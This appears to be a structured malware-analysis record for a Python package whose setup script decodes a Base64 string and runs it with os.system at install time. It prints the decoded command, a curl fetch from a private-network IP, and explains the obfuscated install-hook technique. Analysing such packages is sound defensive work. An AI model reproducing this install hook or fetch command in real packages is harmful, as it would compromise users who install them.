{
  "purpose": "The code defines a setup script for a Python package that executes a decoded Base64 command during installation or development setup.",
  "sources": "The function b64d which decodes Base64 encoded string, called within notmalfunc, which is executed during installation (AfterInstall.run).",
  "sinks": "The os.system call executes arbitrary command decoded from Base64, which leads to remote URL access.",
  "flows": "b64d decodes the string, then os.system executes the decoded command, which opens a URL in the system’s default web browser or command line.",
  "anomalies": "Use of Base64 encoding for a command, execution of external URL via system call during package install, no visible use of user input but executes a hardcoded command that accesses an external resource.",
  "analysis": "The script uses setuptools for package setup, with custom install and develop commands. During installation, notmalfunc() is called, which decodes a Base64 string and executes it via os.system. The decoded command is 'curl -s http://192.168.1.3:8000/test.txt | base', which attempts to retrieve a remote file from an IP address and pipe it to 'base' (likely 'base64'). This behavior indicates potential malicious activity—remote code or data exfiltration, or setup of a backdoor. The use of Base64 to obfuscate the command and its execution during package installation are suspicious. The command appears to connect to a private IP address, indicating possible local network reconnaissance or malicious control.",
  "conclusion": "The package contains embedded malicious behavior by executing a remote URL fetch during installation, which could be used for malicious purposes such as command execution or data exfiltration. The use of Base64 encoding and execution at install time are typical of malicious packages aiming to evade detection. Overall, the code demonstrates malicious intent and poses a security risk.",
